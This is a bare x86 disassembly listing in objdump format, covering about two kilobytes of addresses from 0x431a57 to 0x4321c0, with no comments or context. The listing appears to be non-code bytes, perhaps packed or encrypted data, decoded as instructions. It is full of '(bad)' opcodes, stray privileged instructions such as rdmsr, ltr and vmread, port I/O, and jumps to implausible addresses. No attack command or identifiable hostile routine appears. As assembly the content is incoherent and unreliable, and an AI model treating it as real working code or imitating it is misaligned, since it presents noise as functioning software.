  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
